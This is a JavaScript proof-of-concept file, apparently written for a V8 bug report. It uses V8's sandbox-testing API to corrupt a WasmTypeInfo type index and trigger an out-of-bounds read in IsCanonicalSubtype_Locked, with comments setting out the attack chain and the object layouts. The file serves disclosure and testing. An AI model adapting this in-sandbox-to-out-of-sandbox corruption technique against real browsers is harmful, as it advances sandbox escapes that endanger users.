// CVE-candidate: TypeCanonicalizer::IsCanonicalSubtype_Locked — OOB read
//
// canonical-types.cc:389
//   sub_index = canonical_supertypes_[sub_index.index];  // no bounds check
//
// canonical_supertypes_ is a std::vector<CanonicalTypeIndex> allocated in
// malloc memory OUTSIDE the V8 sandbox VA. SBXCHECK is absent on this path
// (compare wasm-objects.cc:3556 — the sibling JSToWasmObject path that does
// have SBXCHECK).
//
// Attack chain (in-sandbox write → out-of-sandbox read):
//   1. WasmTypeInfo::canonical_type_ is in-cage (writable via Sandbox API)
//   2. Its PayloadField[9:29] holds the 21-bit type index
//   3. Corrupt that field → pass OOB index into IsCanonicalSubtype_Locked
//   4. Loop accesses canonical_supertypes_[OOB] in malloc memory
//
// Flags: --sandbox-testing --allow-natives-syntax
// Expected: SIGABRT (libc++ hardened) or SIGSEGV (non-hardened Release)

d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

// ---- Build a minimal Wasm module with one struct type ----
const b = new WasmModuleBuilder();
const si = b.addStruct([makeField(kWasmI32, true)]);

b.addFunction("make", makeSig([kWasmI32], [wasmRefType(si)]))
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructNew, si])
  .exportFunc();

// accept() takes the struct by ref → triggers JSToWasmObject on call from JS
b.addFunction("accept", makeSig([wasmRefNullType(si)], [kWasmI32]))
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructGet, si, 0])
  .exportFunc();

const inst = b.instantiate();
const s = inst.exports.make(42);
print("[+] Wasm struct created");

// ---- Navigate to WasmTypeInfo::canonical_type_ via Sandbox API ----
//
//  s (WasmStruct, HeapObject):
//    +0  Map   [compressed tagged, 4 bytes]
//
//  Map (HeapObject at map_addr):
//    +0   Map of Map
//    +4   instance_size_in_words (uint8)
//    +8   instance_type (InstanceType, uint16)
//    +10  bit_field (uint8)
//    +11  bit_field2 (uint8)
//    +12  bit_field3 (uint32)
//    +16  prototype [compressed tagged]
//    +20  constructor_or_back_pointer_or_native_context = WasmTypeInfo [compressed tagged]
//
//  WasmTypeInfo (HeapObject at wti_addr):
//    +0   Map   [compressed tagged]
//    +4   canonical_type_  (uint32)  ← 21-bit PayloadField at bits [9:29]
//
// Compressed tagged: lower 32 bits of absolute address, bit 0 = HeapObject tag.
// Sandbox.getAddressOf(x) = lower 32 bits of x's address = cage-relative.
// Cage-relative == compressed (tag excluded): cage_base | raw_compressed.

// Objects with compressed pointers live within the first 4 GB of the cage.
const mv = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const s_addr   = Sandbox.getAddressOf(s);
const map_comp = mv.getUint32(s_addr,       true);
const map_addr = map_comp & ~1;               // strip HeapObject tag

const wti_comp = mv.getUint32(map_addr + 20, true);
const wti_addr = wti_comp & ~1;

const canon_before = mv.getUint32(wti_addr + 4, true);
print(`[+] s          @ 0x${s_addr.toString(16)}`);
print(`[+] Map        @ 0x${map_addr.toString(16)}`);
print(`[+] WasmTypeInfo @ 0x${wti_addr.toString(16)}`);
print(`[+] canonical_type_ (before) = 0x${canon_before.toString(16)}`);

// ---- Corrupt PayloadField (bits 9-29) to max OOB index ----
//
//  PayloadField = RefTypeKindField::Next<uint32_t, 21>
//  RefTypeKindField = IsSharedField::Next<RefTypeKind, 3>  → shift=6
//  So PayloadField shift = 9, size = 21, mask = ((1<<21)-1)<<9 = 0x3FFFFE00
//
//  Replace index bits with 0x1FFFFF (all 21 bits set = 2,097,151).
//  canonical_supertypes_ has only O(1) entries → 0x1FFFFF is way OOB.
//  Preserving bits 0-8 keeps the type kind (kIndexedRef / kStruct) valid
//  so the CanonicalValueType remains a "real" indexed ref type, ensuring
//  IsCanonicalSubtype doesn't bail on the fast path.

const PAYLOAD_MASK = 0x3FFFFE00;             // bits [9:29]
const OOB_INDEX    = 0x1FFFFF;               // 2,097,151
const canon_oob = (canon_before & ~PAYLOAD_MASK) | (OOB_INDEX << 9);
mv.setUint32(wti_addr + 4, canon_oob, true);

const canon_after = mv.getUint32(wti_addr + 4, true);
const injected_idx = (canon_after >> 9) & 0x1FFFFF;
print(`[+] canonical_type_ (after)  = 0x${canon_after.toString(16)}`);
print(`[+] injected index           = 0x${injected_idx.toString(16)} (${injected_idx})`);
print("[*] Triggering JSToWasmObject → IsCanonicalSubtype_Locked → OOB read...");

// ---- Trigger: pass struct to function expecting its type ----
// JSToWasmObject reads type_info->type_index() = OOB, then calls:
//   IsCanonicalSubtype(OOB_INDEX, expected_type)
// → mutex → IsCanonicalSubtype_Locked:
//   while (sub_index.valid()) {        // 0x1FFFFF is valid
//     if (sub_index == super_index) return true;
//     sub_index = canonical_supertypes_[0x1FFFFF];  // ← OOB crash
//   }
try {
  inst.exports.accept(s);
} catch(e) {
  print(`[!] Exception (unexpected, type check should crash): ${e}`);
}
print("[DONE] Reached end — OOB crash did not fire (check flags / build)");
